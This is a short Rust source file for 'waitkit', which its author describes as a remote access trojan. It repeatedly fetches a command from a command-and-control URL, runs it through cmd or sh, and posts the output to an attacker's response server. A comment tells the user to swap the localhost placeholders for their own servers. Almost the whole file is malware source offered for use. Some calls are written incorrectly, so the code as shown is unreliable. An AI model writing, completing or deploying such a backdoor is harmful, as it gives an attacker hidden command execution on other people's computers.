// waitkit v1.0.0
// a really bad RAT written in rust
// licensed under the MIT license
// by TheMemeSniper

extern crate reqwest;
use std::process::Command;
use std::thread::sleep;
use tokio;

#[tokio::main]
async fn main() -> Result<(), reqwest::Error> {
    let c2 = "127.0.0.1:8000/waitkit.txt"; // CHANGE THESE 2 VARIABLES
    let rs = "127.0.0.1:8000/waitkitresponse"; // c2 is your command server (which should store a
                                               // command in plaintext, not HTML) and rs is your
                                               // response server where std will be POSTed to

    let client = reqwest::Client::new();
    loop {
        let res = client.get(c2) // get new command from c2
            .await?
            .text()
            .await?;

        client.post(rs)
        .body(exec(res)) // post stdout of exec to response server
        .send()
        .await?;
        sleep(30);
    }
}

fn exec(command: String) -> Vec<u8> { // function to execute a command and return it
    let output = if cfg!(target_os = "windows") {
        Command::new("cmd")
            .args(["/C", &command])
            .output()
            .expect("failed to execute process")
    } else {
        Command::new("sh")
            .arg("-c")
            .arg(&command)
            .output()
            .expect("failed to execute process")
    };
    return output.stdout;
}
